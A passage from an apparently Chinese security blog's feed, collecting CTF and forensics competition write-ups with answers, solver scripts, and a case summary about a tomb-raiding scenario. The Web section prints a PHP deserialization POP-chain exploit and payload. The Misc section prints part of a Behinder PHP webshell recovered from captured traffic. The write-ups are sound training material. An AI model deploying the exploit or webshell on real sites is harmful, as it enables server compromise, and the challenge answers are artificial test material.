src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407300114570.png" alt="image-20240730011402242"></p><h3 id="40、检材6-手机上安装了哪些隐写工具？（1分）"><a href="#40、检材6-手机上安装了哪些隐写工具？（1分）" class="headerlink" title="40、检材6-手机上安装了哪些隐写工具？（1分）"></a>40、检材6-手机上安装了哪些隐写工具？（1分）</h3><pre><code>Stegais Steganography</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407300114202.png" alt="image-20240730011438813"></p><h3 id="41、检材8-使用的苹果账号是？（1分）"><a href="#41、检材8-使用的苹果账号是？（1分）" class="headerlink" title="41、检材8-使用的苹果账号是？（1分）"></a>41、检材8-使用的苹果账号是？（1分）</h3><pre><code>rdmf_top@163.com</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407301706956.png" alt="image-20240730011622858"></p><h3 id="42-检材8-系统版本是？（x-x-x）（1分）"><a href="#42-检材8-系统版本是？（x-x-x）（1分）" class="headerlink" title="42.检材8-系统版本是？（x.x.x）（1分）"></a>42.检材8-系统版本是？（x.x.x）（1分）</h3><pre><code>17.5.1</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407300117272.png" alt="image-20240730011700969"></p><h3 id="43、检材8-使用的WiFi网络名为“大兄弟的网络”的MAC地址是？（例：xx-xx…）（2分）"><a href="#43、检材8-使用的WiFi网络名为“大兄弟的网络”的MAC地址是？（例：xx-xx…）（2分）" class="headerlink" title="43、检材8-使用的WiFi网络名为“大兄弟的网络”的MAC地址是？（例：xx:xx…）（2分）"></a>43、检材8-使用的WiFi网络名为“大兄弟的网络”的MAC地址是？（例：xx:xx…）（2分）</h3><pre><code>5e:37:7d:2a:47:5e</code></pre><h4 id="在检材8中分析"><a href="#在检材8中分析" class="headerlink" title="在检材8中分析"></a>在检材8中分析</h4><p>发现直接分析的结果中是没有wifi的信息的 但是我们知道存放ios系统的wifi信息的文件的路径是</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407300933530.png" alt="image-20240730093355447"></p><p>那么直接翻文件夹 虽然没有直接找到这个pslist文件 但是可以找到两个类似的<code>com.apple.wifi-networks.plist</code>和<code>com.apple.wifi-networks.plist.backup</code>  </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407300934854.png" alt="image-20240730093420554"></p><p>直接查看<code>com.apple.wifi-networks.plist</code> 发现没有东西 那么我们把<code>com.apple.wifi-networks.plist.backup</code>  导出  在用pslist Editor查看 找到关于WiFi网络名为“大兄弟的网络”的相关信息</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407300938935.png" alt="image-20240730093821671"></p><h4 id="在检材4导出的苹果手机备份中分析"><a href="#在检材4导出的苹果手机备份中分析" class="headerlink" title="在检材4导出的苹果手机备份中分析"></a>在检材4导出的苹果手机备份中分析</h4><p>抽象的一点 这个wifi的信息竟然在之前导出的苹果手机备份中也有 而且是可以直接分析出来的</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407301023322.png" alt="image-20240730102053020"></p><p>当然可以分析出来的原因是有可以被火眼识别出的pslist文件记录了这个wifi信息</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407301023265.png" alt="image-20240730102311135"></p><h3 id="44、检材8-手机IMEI是？（1分）"><a href="#44、检材8-手机IMEI是？（1分）" class="headerlink" title="44、检材8-手机IMEI是？（1分）"></a>44、检材8-手机IMEI是？（1分）</h3><pre><code>357272092128408</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407300127325.png" alt="image-20240730012714012"></p><h3 id="45、检材3-BitLocker恢复密钥（5分）"><a href="#45、检材3-BitLocker恢复密钥（5分）" class="headerlink" title="45、检材3-BitLocker恢复密钥（5分）"></a>45、检材3-BitLocker恢复密钥（5分）</h3><pre><code>010461-617507-553498-499752-253286-356334-124773-180169</code></pre><p>接第九题</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1.大体人物关系如下图</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407301728012.png" alt="image-20240730172833925"></p><p>2.前面的题目正常分析 第9题需要对windows硬盘进行bitlocker密钥爆破 由第五题得知 本案的大体方向是盗墓 并且盗墓团伙的主要通讯工具是铛铛 需要手动分析聊天记录数据库</p><p>3.对macbook进行仿真分析 查看文物中转站聊天室.html 得知盗墓团伙三个成员：眼镜仔 张老四 王胖子 同时在其中找到苹果手机备份 爆破密钥进行解密</p><p>4.在找到的苹果备份的微信聊天记录中得知 眼镜仔和买家大金牙联系进行销赃</p><p>5.在检材6大金牙的安卓手机Telegram聊天记录中得知 大金牙和国外买家James David联系 进行二手交易文物 同时 在对检材6的分析中发现搜索下载安装了隐写工具 并且聊天记录中提到在图片上的文物价格并没有直接显示在原图片上 通过直接在模拟器中安装对应的隐写工具恢复出被隐写的文物价格信息</p><p>6.最后回到关于盗墓行动的相关信息 在检材1的铛铛聊天记录中提到的盗墓地点、盗墓前集合地、盗墓后集合地的三张图片 在检材2的一个压缩包中找到 通过分析图片的EXIF信息 从而得知地点的具体经纬度信息。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2024中科实数杯wp&quot;&gt;&lt;a href=&quot;#2024中科实数杯wp&quot; class=&quot;headerlink&quot; title=&quot;2024中科实数杯wp&quot;&gt;&lt;/a&gt;2024中科实数杯wp&lt;/h1&gt;&lt;h2 id=&quot;鉴定材料&quot;&gt;&lt;a href=&quot;#鉴定材料&quot; class=&quot;</summary>
      
    
    
    
    <category term="取证" scheme="http://w3nx1z1.github.io/categories/%E5%8F%96%E8%AF%81/"/>
    
    
  </entry>
  
  <entry>
    <title>2024斟茶王者wp</title>
    <link href="http://w3nx1z1.github.io/2024/07/23/2024%E6%96%9F%E8%8C%B6%E7%8E%8B%E8%80%85/"/>
    <id>http://w3nx1z1.github.io/2024/07/23/2024%E6%96%9F%E8%8C%B6%E7%8E%8B%E8%80%85/</id>
    <published>2024-07-22T16:44:28.035Z</published>
    <updated>2024-08-01T12:16:13.469Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="a317c7dd3b45c851cdea5d1c92fadcd9196cde7bc666d9f87687709e06fd9b4e"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码查看喔</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="取证" scheme="http://w3nx1z1.github.io/categories/%E5%8F%96%E8%AF%81/"/>
    
    
  </entry>
  
  <entry>
    <title>R3CTF2024</title>
    <link href="http://w3nx1z1.github.io/2024/06/11/R3CTF/"/>
    <id>http://w3nx1z1.github.io/2024/06/11/R3CTF/</id>
    <published>2024-06-11T13:55:19.473Z</published>
    <updated>2024-06-11T13:55:46.564Z</updated>
    
    <content type="html"><![CDATA[<h1 id="R3CTF"><a href="#R3CTF" class="headerlink" title="R3CTF"></a>R3CTF</h1><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="hideAndSeek"><a href="#hideAndSeek" class="headerlink" title="hideAndSeek"></a>hideAndSeek</h3><pre><code>Ben is a superpower who loves playing hide and seek. He can teleport to anywhere to no one can find him, but he seems unaware that his ability only works within a certain rangeRules:The adorable Ben will only appear within the range of (0, -50, 0) to (128, 50, 128).Ben will every 10 seconds and reappear in a new location after 10 seconds.A &quot;newtp&quot; has been added for all players to teleport to any coordinates.Connect info: 34.81.163.238version 1.19.2</code></pre><p>很抽象的mc游戏题 开始确实是用PCL2模拟器进入游戏去玩</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406111941074.png" alt="image-20240611194137010"></p><p>看到给了个newtp命令 还查了很多教程去学MC的tp命令是如何使用 但是发现没啥用 在地图里面逛了一会儿 </p><p>用newtp大概传送了一些坐标 命令格式如下</p><pre><code>想传送到的坐标(x, y, z)newtp x y z</code></pre><p>后面直接翻log日志文件 找到flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406111944005.png" alt="image-20240611194432924"></p><p>读日志可以发现 这个”Ben”的尸体类型应该是村民 并且他的名称就是flag</p><pre><code>R3CTF&#123;Jus7_play_m0r3_h1de_2nd_seek_w1th_Ben&#125;</code></pre><h3 id="h1de-ndSe3k"><a href="#h1de-ndSe3k" class="headerlink" title="h1de@ndSe3k"></a><strong>h1de@ndSe3k</strong></h3><p>其实做法和上面差不多 这次就算是Ben隐形了也没关系 我们只需要传送几次 等待一段时间 Ben会自己因为某种原因卡死 我们再从日志里面找他的死亡记录就行 但是因为服务器好像是关掉了 没法复现了 当时也是傻了 应该用上一题的方法再试一下</p><h3 id="Blizzard-CN-Restarts"><a href="#Blizzard-CN-Restarts" class="headerlink" title="Blizzard CN Restarts"></a>Blizzard CN Restarts</h3><p>但是没玩过魔兽 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406112149143.png" alt="image-20240611214939074"></p><p>找个修改器打开看一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406112152521.png" alt="image-20240611215201456"></p><p>全部解压出来 使用FileLocator开搜 找到flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406112151089.png" alt="image-20240611215156030"></p><h2 id="forensics"><a href="#forensics" class="headerlink" title="forensics"></a>forensics</h2><h3 id="TPA-01"><a href="#TPA-01" class="headerlink" title="TPA 01"></a>TPA 01</h3><p>e01镜像 直接丢进火眼 分析出个嵌套证据</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406112032961.png" alt="image-20240611203233869"></p><p>其实做这个题的时候分析过程还挺复杂的 感觉想的过于复杂了 归其原因还是经验太少 我甚至仿真起来了</p><p>翻文件夹的时候找到wsl 在结合嵌套证据 感觉预期解应该是要把这个系统恢复出来  </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406112050449.png" alt="image-20240611205056379"></p><p>但是好在有取证工具 不用恢复出来也可以做 下面就是由于我翻文件系统不仔细发现的另一种途径</p><p>010直接把密文翻出来了 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406112055098.png" alt="image-20240611205514050"></p><p>但是在火眼里面直接能看到 还能看到一个关于密钥的提示</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406112056901.png" alt="image-20240611205601842"></p><pre><code>key：Do you like watch videos on youtube?Something fun there:https://www.youtube.com/@d3f4u1t-lololF14G：Hi players,welcome !Ops,what&#39;s that?2d422fc7f2c628c55520984c0673964eb5454dea72f79b1022a34728294c5bf8I guess u need a key to decrypt it.SELECT something FROM somewhere with the windows10 lol~</code></pre><p>根据提示 <code>SELECT something FROM somewhere</code> 想到应该和sql语句有点关系</p><p>先看一下key里面提到的视频</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406112058291.png" alt="image-20240611205806214"></p><p>有个字符串 提出来看看</p><pre><code>0x6d617962652075206e6565642c746861742773206e6f74206162736f6c7574650a726f6f743a5040357357307264466f7255maybe u need,that&#39;s not absoluteroot:P@5sW0rdForU</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406112058384.png" alt="image-20240611205838309"></p><p>给了个密码 尝试登陆mysql 成功登陆</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406112119979.png" alt="image-20240611211910791"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406112119328.png" alt="image-20240611211951295"></p><pre><code>select * from secret;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406112120733.png" alt="image-20240611212016645"></p><p>FFD8的头 一眼jpg图片 保存下来 给出了AES解密的key</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406112120597.png" alt="image-20240611212052560"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406112121765.png" alt="image-20240611212115703"></p><p>其实这里也可以用一个项目<a href="https://github.com/ddcw/ibd2sql">ibd2sql</a>来解密数据库<code>secret.ibd</code>也可以</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406112128083.png" alt="image-20240611212802969"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406112128912.png" alt="image-20240611212855289"></p><h3 id="TPA-02-📱"><a href="#TPA-02-📱" class="headerlink" title="TPA 02 - 📱"></a>TPA 02 - 📱</h3><pre><code>Peggy is an employee at a company and, like many others, occasionally uses her personal mobile phone for work-related tasks. Unfortunately, she has become the target of a phishing attack. Your task is to uncover the details of this attack by finding the attacker&#39;s phone number and Peggy&#39;s password.Submit your findings in the format r3ctf&#123;number_password&#125;. For the phone number, remove any symbols and spaces. For example, if the attacker&#39;s phone number is +1 123-456-7890 and the password Peggy entered is passwd, your flag should be r3ctf&#123;11234567890_passwd&#125;.</code></pre><p>两部分 一个是找攻击者的手机号码 一个是找Peggy的登陆密码</p><p>先看流量 直接追踪tcp流 在第31个流 找到login登录页面</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406112012655.png" alt="image-20240611201202596"></p><p>先找到password:l0v3_aNd_peace</p><p>再看给的手机文件夹 直接用火眼分析 分析出两个手机号</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406112015219.png" alt="image-20240611201527146"></p><p>根据语境 可以得知是15555215556这个号码应该是Peggy的同事 来询问Peggy是否也收到了钓鱼信息</p><p>那下面的15555215558 应该就是攻击者的手机号码 直接组合起来</p><pre><code>r3ctf&#123;15555215558_l0v3_aNd_peace&#125;</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;R3CTF&quot;&gt;&lt;a href=&quot;#R3CTF&quot; class=&quot;headerlink&quot; title=&quot;R3CTF&quot;&gt;&lt;/a&gt;R3CTF&lt;/h1&gt;&lt;h2 id=&quot;misc&quot;&gt;&lt;a href=&quot;#misc&quot; class=&quot;headerlink&quot; title=&quot;misc&quot;</summary>
      
    
    
    
    <category term="ctf" scheme="http://w3nx1z1.github.io/categories/ctf/"/>
    
    
    <category term="misc" scheme="http://w3nx1z1.github.io/tags/misc/"/>
    
    <category term="forensics" scheme="http://w3nx1z1.github.io/tags/forensics/"/>
    
  </entry>
  
  <entry>
    <title>第二届黄河流域网络攻防竞赛</title>
    <link href="http://w3nx1z1.github.io/2024/06/11/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%BB%84%E6%B2%B3%E6%B5%81%E5%9F%9F-%E8%A5%BF%E6%9F%9A%E5%96%B5%E5%B8%95%E6%96%AF/"/>
    <id>http://w3nx1z1.github.io/2024/06/11/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%BB%84%E6%B2%B3%E6%B5%81%E5%9F%9F-%E8%A5%BF%E6%9F%9A%E5%96%B5%E5%B8%95%E6%96%AF/</id>
    <published>2024-06-11T09:43:23.752Z</published>
    <updated>2024-06-11T11:30:24.022Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第二届黄河流域-西柚喵帕斯"><a href="#第二届黄河流域-西柚喵帕斯" class="headerlink" title="第二届黄河流域-西柚喵帕斯"></a><strong>第二届黄河流域-西柚喵帕斯</strong></h1><h2 id="取证分析"><a href="#取证分析" class="headerlink" title="取证分析"></a><strong>取证分析</strong></h2><h3 id="内存取证1"><a href="#内存取证1" class="headerlink" title="内存取证1"></a><strong>内存取证1</strong></h3><pre><code>问题1：桌面上表格文件是什么？提交答案格式为flag&#123;带后缀名的敏感文件名称&#125;，比如flag&#123;敏感文件.xls&#125;</code></pre><p>使用r-studio打开</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406111722408.jpg" alt="img"> </p><h3 id="内存取证2"><a href="#内存取证2" class="headerlink" title="内存取证2"></a><strong>内存取证2</strong></h3><pre><code>问题2：JohnDoe用户登录mysql密码是多少？提交答案格式为flag&#123;登录密码&#125;，比如flag&#123;root&#125;。</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406111722022.jpg" alt="img"> </p><h3 id="内存取证3"><a href="#内存取证3" class="headerlink" title="内存取证3"></a><strong>内存取证3</strong></h3><pre><code>问题3：找到镜像中隐藏的flag，提交答案格式为flag&#123;中文&#125;</code></pre><p>从第一题找到的xls入手分析</p><p>先导出分析</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406111722023.jpg" alt="img"> </p><p>改xls后缀名 打开要密码 尝试用上面的mysql登录密码 打开找到flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406110021282.jpg" alt="img"> </p><p>utf-7编码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406111722024.jpg" alt="img"> </p><h3 id="取证分析1"><a href="#取证分析1" class="headerlink" title="取证分析1"></a><strong>取证分析1</strong></h3><pre><code>某单位员工使用edge浏览器访问了钓鱼站点，导致edge进程崩溃了，员工的电脑上设置了程序崩溃自动保存内存dump文件。请通过该文件，对该事件进行分析。 问题1：小A访问的钓鱼网站网址是什么？提交答案格式为flag&#123;url&#125;，比如flag&#123;http://a.b.c.d:1234/x.html&#125;</code></pre><p>vol和AXIOM都分析不了 只能直接strings </p><p>Plain Text strings edge.dmp | grep “http:&#x2F;&#x2F;“</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406110021285.jpg" alt="img"> </p><h3 id="取证分析2"><a href="#取证分析2" class="headerlink" title="取证分析2"></a><strong>取证分析2</strong></h3><pre><code>问题2：对方在edge进程中执行了shellcode，似乎是执行命令失败了，找出他执行命令调用的win32 api。提交答案格式为flag&#123;api&#125;，比如flag&#123;kernel32!RtlCaptureContext&#125;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406110021771.jpg" alt="img"> </p><p>Bash kernel32!WinExec</p><h3 id="取证分析3"><a href="#取证分析3" class="headerlink" title="取证分析3"></a><strong>取证分析3</strong></h3><pre><code>问题3：找出对方想要执行的命令行内容，提交答案格式为flag&#123;钓鱼站点想要执行的命令行内容&#125;，命令中若存在空格请使用_代替，其他符号不变，区分大小写，格式如flag&#123;cmd_/c_ip_tables!&#125;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406110021777.jpg" alt="img"> </p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a><strong>Crypto</strong></h2><h3 id="Easyrsa"><a href="#Easyrsa" class="headerlink" title="Easyrsa"></a><strong>Easyrsa</strong></h3><pre><code>from itertools import permutations from Crypto.Util.number import *  z = [&#39;0111101011111101000011111100011110110111100011001110111101110110110001110111000100101100110101001010101100011100110110011011111110110111010000000011010010100000110101110011101000100100100011101101100010100001010100000000010000100101111100111111111101111010&#39;, &#39;1101000000101000011011010111111110011110001001101011001011000101110000010100100011011101011101011110001010111111111111011110000110111011010011000110111010010110000101001000000101010011000100111000111001001100011010100011100000000010100011100000111110001110&#39;, &#39;1010011111001110000111011001100100011011011000101010010000001011010011011111010001000101110101010101011101011110101101011010110101010000010100010111111111101110010110011001111010000100100011011100000111110001110000010001010101101101101110000011011000101011&#39;, &#39;0100110010000010001110101000101000111011111110000001000001100010000000111111101100100111110011000100111010101000100011001110101100001011110010111000010001001010010000000011111000101011111010111101000001000000001101100100101001100010000100001111100111111010&#39;, &#39;0111001101001010111111101010011101100000011001101111011010001000110010111010111111101000000001001011000001000110100111110001000011011000011110110101100100101011101010110001110110010000100001101110000000100011011101110111011111011000001100001000000110110011&#39;, &#39;0110111010001001010000000001000001100110100100010010011100110011101111000101110100000000000100010111111110001010111111010111011011001001010110110000110001010011000111010110100100010100100111100101001010101011011110001101110101100010110010111100100101010111&#39;, &#39;1011101011100010101111010010000100010011111101101011011110000010010000011101010001001010000000111100000100001011001111100100000100101001111010010110000001010101111110111001011111000110110110100101111000010000100010010111010000100110010100011000000100001111&#39;, &#39;1001101111111001100011101111011101101011100110100011000100111100010101011001100001011000110110000000101011010100110001110000110001110111111001010010101000100110011010111101101101001101011111000111010000110001110000000001000111000001011110010000001111010011&#39;] c = 13003314666259100924056004488192879951991824059911508262140097706018888705955470264051361935101455340094971529836127008746457786892275972565449113840328391209339169000395470738780766025271862970759571146381234096267258200970822986151050047882589038375903133053657805275788419550498651112234266443422536799276888423014856283593968916394415760552426237539489292338903806512371485857542164997008922471994591413796274552848851859976522014922044409925823881793117165653534217369362159387632321283129023449326780775659395803089477090226867368824000190350663854144716638637456141115609096321561091304903356851544525526615903 e = 65537  for perm in permutations(z, r=8):   group1 = perm[:4]    group2 = perm[4:]      p_str = &#39;&#39;.join(group1)   q_str = &#39;&#39;.join(group2)    p = int(p_str, 2)   q = int(q_str, 2)    phi_n = (p - 1) * (q - 1)   d = pow(e, -1, phi_n) if phi_n != 0 else None    if d is None:     continue   m = pow(c, d, p * q)    decrypted_message = long_to_bytes(m)   if b&#39;flag&#39; in decrypted_message:     print(decrypted_message)     break </code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406110021781.jpg" alt="img"> </p><h3 id="Ecc"><a href="#Ecc" class="headerlink" title="Ecc"></a><strong>Ecc</strong></h3><p>板子题</p><pre><code>from Crypto.Util.number import * #1 p = 49383540788757109209399937015403058078091585436614706959465496296978436108887 a = 55685723875233231914244109412725461970324405506250247848835714736428531894083 b = 14465416621366336584787787222004413359301857947979225099379614554383512880491 k = 17863723127130927912437094121795715840619733807126707833630214910470361917913 E = EllipticCurve(GF(p),[a,b]) c1 = E([41878742451091353952894887712068645971005265624587580702506356899238014833578, 33882347397378893053663991901529711743049843524447349970546724946010958254490]) c2 = E([32044441001201280220364823846903588184438951716534669244501751822900705328405, 20808501842510819101565506724685661870434821018672081897206182291278825489793]) cipher = 8126088154459418019024039065681028044223135048676741656267021276727337263061 m = c1 - k * c2 num1 = cipher//m[0]   # 2 p=12506217790875063466368723611056175369923 A=12506217790875063466368723611052784275139 B=12506217790875063466368723533070038257347 E = EllipticCurve(GF(p),[A,B]) P = E(12209581121985501571384146459209070740325, 343933414533064030464400914099323495391) Q = E(6578542526388549877571325989098572012221, 1792660825364939960209890135582772010119)  def SmartAttack(P,Q,p):   E = P.curve()   Eqp = EllipticCurve(Qp(p, 2), [ ZZ(t) + randint(0,p)*p for t in E.a_invariants() ])    P_Qps = Eqp.lift_x(ZZ(P.xy()[0]), all=True)   for P_Qp in P_Qps:     if GF(p)(P_Qp.xy()[1]) == P.xy()[1]:       break    Q_Qps = Eqp.lift_x(ZZ(Q.xy()[0]), all=True)   for Q_Qp in Q_Qps:     if GF(p)(Q_Qp.xy()[1]) == Q.xy()[1]:       break    p_times_P = p*P_Qp   p_times_Q = p*Q_Qp    x_P,y_P = p_times_P.xy()   x_Q,y_Q = p_times_Q.xy()    phi_P = -(x_P/y_P)   phi_Q = -(x_Q/y_Q)   k = phi_Q/phi_P   return ZZ(k)  num2 = SmartAttack(P, Q, p)  print(long_to_bytes(int(num1))+long_to_bytes(int(num2)))</code></pre><p><a href="https://blog.csdn.net/XiongSiqi_blog/article/details/132005590#_2021ecc_209">https://blog.csdn.net/XiongSiqi_blog/article/details/132005590#_2021ecc_209</a></p><p>分别是HGAME2022week4 ECC和 第五空间2021 ecc的第三部分</p><pre><code>flag&#123;1eo0kuvanq6vghtlpswe&#125;</code></pre><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a><strong>Web</strong></h2><h3 id="Unser"><a href="#Unser" class="headerlink" title="Unser"></a><strong>Unser</strong></h3><p>原题 没什么好说的  照着打就行了</p><p><a href="https://blog.csdn.net/qq_51768842/article/details/125153850">https://blog.csdn.net/qq_51768842/article/details/125153850</a></p><pre><code>poc  &lt;?php   highlight_file(__FILE__);   class wel &#123;   public $fast;   public $star;     public function __construct()   &#123;     $this-&gt;fast = &#39;free__toto&#39;;     echo $this-&gt;fast;     echo &quot;what?&quot;;   &#125;     public function __destruct()   &#123;     $content = $this-&gt;star;     printf($content);   &#125;     public function ctf()   &#123;     echo &#39;welcome?&#39;;   &#125;   &#125;   class  database &#123;   public $hostname = &#39;127.0.0.1&#39;;   public $dbuser = &#39;root&#39;;   public $dbpass = &#39;root&#39;;   public $database;   public $str;   public $challange;     public function __construct($database)   &#123;     $this-&gt;database = $database;   &#125;     public function __invoke()   &#123;     function welcome()     &#123;       echo &#39;do_it?&#39;;     &#125;       $this-&gt;str-&gt;open($this-&gt;database);     &#125;   &#125;   class flag &#123;   public $file;   public $params;     public function __construct()   &#123;     $this-&gt;file = array();   &#125;     public function __toString()   &#123;     return $this-&gt;getfunction();   &#125;     public function getfunction()   &#123;     $func = $this-&gt;params;     echo &#39;you win?&#39;;     $func();   &#125;   &#125;   $w=new wel(); $w-&gt;star=new flag(); $w-&gt;star-&gt;params=new database(&#39;fl@g.php&#39;); $w-&gt;star-&gt;params-&gt;str=new SQLite3(&#39;fl@g.php&#39;); echo serialize($w);</code></pre><pre><code>exp  noway=O:3:&quot;wel&quot;:2:&#123;s:4:&quot;fast&quot;;s:10:&quot;free__toto&quot;;s:4:&quot;star&quot;;O:4:&quot;flag&quot;:2:&#123;s:4:&quot;file&quot;;a:0:&#123;&#125;s:6:&quot;params&quot;;O:8:&quot;database&quot;:6:&#123;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:4:&quot;root&quot;;s:6:&quot;dbpass&quot;;s:4:&quot;root&quot;;s:8:&quot;database&quot;;s:8:&quot;fl@g.php&quot;;s:3:&quot;str&quot;;O:7:&quot;SQLite3&quot;:0:&#123;&#125;s:9:&quot;challange&quot;;N;&#125;&#125;&#125;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406111722025.jpg" alt="img"> </p><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a><strong>Re</strong></h2><h3 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a><strong>easyre</strong></h3><p>有py特征</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406110021816.jpg" alt="img"> </p><p>转储</p><p>Bash objcopy –dump-section pydata&#x3D;pydata.dump file.elf</p><p>再用pyinstxtractor拆包</p><p>拿到pyc文件反编译看源码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406111722026.jpg" alt="img"> </p><p>import了一叫touch的so库文件</p><p>定位到jiami函数</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406110021944.jpg" alt="img"> </p><p>定位密文</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406110021343.jpg" alt="img"> </p><p>exp:</p><p>Python print(‘’.join([chr(i&#x2F;&#x2F;2 ^ 0x25) for i in [0x86, 0x92, 0x88, 0x84, 0xBC, 0xEA, 0xB8, 0xF4, 0x28, 0x2C, 0xF4, 0x2C, 0xCA, 0xAC, 0xB8, 0xF4, 0xC2, 0x2A, 0x96, 0x24, 0xF4, 0xE2, 0x2A, 0xA0, 0x2E, 0x9A, 0xF4, 0xD0, 0x2C, 0xF4, 0xC8, 0x84, 0x88, 0x98, 0x96, 0x08, 0xB0]]))</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a><strong>Misc</strong></h2><h3 id="LL"><a href="#LL" class="headerlink" title="LL"></a><strong>LL</strong></h3><p>发现问题</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406111722027.jpg" alt="img"> </p><p>搜一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406111722028.jpg" alt="img"> </p><p>第105流 得知解密流程分3步</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406110021694.jpg" alt="img"> </p><p>在第104流找到密文</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406110021963.jpg" alt="img"> </p><p>直接赛博厨子解<a href="https://wikipedia.org/wiki/Quoted-printable">Quoted-printable</a> 解密后的内容单独保存出来</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406110021374.jpg" alt="img"> </p><p>看着像base64 继续解密</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406111722029.jpg" alt="img"> </p><p>这里发现又将一个base64的内容写入了about.php中</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406111722031.jpg" alt="img"> </p><p>继续解base64 是一个冰蝎解密脚本</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406110021431.jpg" alt="img"> </p><pre><code>&lt;?php @error_reporting(0); session_start();   $key=&quot;e45e329feb5d925b&quot;; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond     $_SESSION[&#39;k&#39;]=$key;     session_write_close();     $post=file_get_contents(&quot;php://input&quot;);     if(!extension_loaded(&#39;openssl&#39;))     &#123;         $t=&quot;base64_&quot;.&quot;decode&quot;;         $post=$t($post.&quot;&quot;);                  for($i=0;$i&lt;strlen($post);$i++) &#123;                $post[$i] = $post[$i]^$key[$i+1&amp;15];                &#125;     &#125;     else     &#123;         $post=openssl_decrypt($post, &quot;AES128&quot;, $key);     &#125;   $arr=explode(&#39;|&#39;,$post);   